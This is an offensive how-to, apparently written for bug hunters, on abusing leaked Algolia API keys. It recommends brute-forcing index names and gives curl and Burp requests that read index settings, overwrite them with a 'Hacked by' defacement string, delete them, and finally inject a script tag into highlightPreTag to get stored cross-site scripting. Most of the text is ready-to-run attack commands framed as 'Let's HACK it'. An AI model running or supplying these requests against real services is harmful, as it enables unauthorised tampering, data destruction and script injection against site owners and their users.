## How to Exploit:
* https://shahjerry33.medium.com/api-misconfiguration-algolia-api-key-b3f4a9f04f0d
* https://www.secjuice.com/api-misconfiguration-data-breach/

If you got a Algolia API key, that's great dude....! Let's HACK it.

* First, You need an API Key, an app ID, and an index name. (If you do not have an index name, then try brute force.)
  In my case, I have only an API key and an app ID, So I brute-forced and then found the index name.
  
### In curl command:
~~~
curl "https://J<App Id>-dsn.algolia.net/1/keys/<API key>?x-algolia-application-id=<App Id>&x-algolia-api-key=<API key>" | jq
~~~
From this command you will only get some informations. After getting the Index name:

### In Burpsuite:
~~~
GET /1/indexes/<Index name>/settings HTTP/1.1
Host: <AppID>-1.algolianet.com
x-algolia-api-key: <api key>
x-algolia-application-id: <App Id>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
~~~
Using the above request, you can get lots of information about the target.


### Exploitable:
Here are the corresponding HTTP verbs for each operation:

* Create: HTTP POST
* Read: HTTP GET
* Update: HTTP PUT or HTTP PATCH
* Delete: HTTP DELETE

#### In POST Method:
```
curl -X POST --url https://<App-Id>-1.algolianet.com/1/indexes/<Index-name>/settings --header ‘content-type: application/json’ --header ‘x-algolia-api-key: <API-key>’ --header ‘x-algolia-application-id: <App-Id>>’ --data ‘{“highlightPreTag”: “Hacked by hackerhijeck”}’
```
#### In GET Method:
```
curl --url https://<App-Id>-1.algolianet.com/1/indexes/<Index-name>/settings --header ‘content-type: application/json’ --header ‘x-algolia-api-key: <API-key>’ --header ‘x-algolia-application-id: <App-Id>’
```
#### In PUT Method:
```
curl -X PUT --url https://<App-Id>-1.algolianet.com/1/indexes/<Index-name>/settings --header ‘content-type: application/json’ --header ‘x-algolia-api-key: <API-Key>’ --header ‘x-algolia-application-id: <App-Id>’ --data ‘{“highlightPreTag”: “Hacked by hackerhijeck”}’
```
#### In PATCH Method:
```
curl -X PATCH --url https://<App-Id>-1.algolianet.com/1/indexes/<Index-name>/settings --header ‘content-type: application/json’ --header ‘x-algolia-api-key: <API-key>’ --header ‘x-algolia-application-id: <App-Id>’ --data ‘{“highlightPreTag”: “Hacked by hackerhijeck”}’
```
#### In DELETE Method:
```
curl -X DELETE --url https://<App-Id>-1.algolianet.com/1/indexes/<Index-name>/settings --header ‘content-type: application/json’ --header ‘x-algolia-api-key: <API-key>’ --header ‘x-algolia-application-id: <App-Id>’ --data ‘{“highlightPreTag”: “Hacked by hackerhijeck”}’
```
#### Exploit Code using Curl Command:
```
curl --request PUT \
  --url https://<App-Id>-1.algolianet.com/1/indexes/<Index-name>/settings \
  --header 'content-type: application/json' \
  --header 'x-algolia-api-key: <API-key>' \
  --header 'x-algolia-application-id: <App-Id>' \
  --data '{"highlightPreTag": "<script>alert(1);</script>"}'
```
